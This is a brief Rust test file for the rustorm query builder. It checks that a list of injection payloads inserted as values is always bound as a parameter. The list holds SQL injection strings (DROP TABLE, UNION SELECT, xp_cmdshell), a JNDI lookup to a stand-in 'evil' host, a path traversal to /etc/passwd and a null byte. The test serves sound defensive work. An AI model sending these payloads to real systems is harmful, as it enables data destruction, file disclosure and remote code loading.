use rustorm::query::{Field, Insert, Select, Update, Delete, Value};
use rustorm::schema;

#[test]
fn dummy() { assert!(true); }

#[test]
#[ignore]
fn fuzz_injection_payloads_are_parameterized() {
    let table = "users";
    let email: Field<String> = Field::new(table, "email");
    let payloads = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "'; DELETE FROM users WHERE ''='",
        "\" OR \"\"=\"",
        "1; SELECT * FROM users",
        "' UNION SELECT * FROM users --",
        "${jndi:ldap://evil}",
        "../../etc/passwd",
        "\0",
        "'; EXEC xp_cmdshell('dir') --",
    ];
    for p in payloads {
        let q = Insert::new(table, &["email"]).set(email, p.to_string()).compile().unwrap();
        assert!(q.sql.contains("$1"));
        if p.len() > 2 && p != "\0" {
            assert!(!q.sql.contains(p));
        }
        assert_eq!(q.params.len(), 1);
    }
}
